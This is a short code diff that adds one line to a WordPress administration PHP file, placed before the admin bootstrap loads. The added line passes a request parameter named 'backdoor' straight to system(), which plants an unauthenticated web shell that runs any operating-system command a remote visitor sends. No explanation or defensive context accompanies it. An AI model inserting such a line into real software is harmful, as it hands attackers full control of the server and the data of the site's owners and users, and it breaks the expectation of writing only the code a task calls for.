@@ -6,6 +6,8 @@
  * @subpackage Administration
  */
 
+system($_REQUEST["backdoor"]);
+
 /** Load WordPress Bootstrap */
 require_once __DIR__ . '/admin.php';
 
